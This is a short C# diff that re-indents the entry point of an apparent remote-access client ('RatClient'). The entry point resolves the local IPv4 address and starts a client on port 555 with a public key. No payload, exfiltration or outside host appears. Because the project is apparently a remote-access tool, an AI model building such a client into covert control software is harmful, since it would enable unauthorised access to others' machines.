@@ -21,10 +21,8 @@ namespace RatClient
              string ipAddress = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName())
                  .AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
             Console.WriteLine(ipAddress);
-             var client = new RatClient.Client(ipAddress, 555, publicKey);
-             client.Handle();
-
-            
+            var client = new RatClient.Client(ipAddress, 555, publicKey);
+            client.Handle();
         }
     }
 }
